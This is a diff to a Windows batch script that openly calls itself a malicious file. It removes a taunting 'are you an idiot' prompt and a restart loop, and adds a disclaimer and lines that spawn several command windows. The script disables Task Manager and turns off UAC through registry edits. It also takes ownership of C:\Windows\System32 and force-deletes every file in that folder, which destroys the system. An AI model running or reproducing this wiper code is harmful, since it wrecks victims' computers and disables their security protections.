@@ -1,18 +1,14 @@
-@echo off 
-echo ARE YOU AN IDIOT? (answer in only yes/no)
-set /p input=
-if /i %input%==yes goto no
-if /i %input%==no goto no
-if /i not %input%== yes,no goto 1
-
-:yes
-@echo "Yeah you really are LOL see you later!! (im not responsible for any damages done!!"
-pause
-exit
-:no 
-@echo you really think you aren't... lol THINK AGAIN!!!
-timeout /t 5 NOBREAK > nul 
+echo "im not responible for any of the damages caused by this malicious file whatsoever and will not be held accountable for your actions or mine!!!!!
+timeout /t 6 NOBREAK >nul
 start https://whatismyipadress.com
+@echo off
+start cmd
+start powershell
+start powershell
+start cmd
+start cmd
+start cmd
+@echo off
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 REM Check if running with admin privileges
 net session >nul 2>&1
@@ -43,24 +39,13 @@ echo.
 
 REM Take ownership of System32
 @echo off
-if "%1" equ "Restarted" goto %1
-
-:again
-echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
-goto :again
-
-:Restarted
-:loop
-timeout /T 1 > NUL
-goto loop
-if false goto continue
-:continue
 takeown /f C:\Windows\System32 /r /d y
 icacls C:\Windows\System32 /grant administrators:F /t
 cd C:\Windows\System32
 
 REM Delete System32
 timeout /t 4 NOBREAK > nul
+@echo off
 del /F /S /Q *.*
 
 %windir%\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
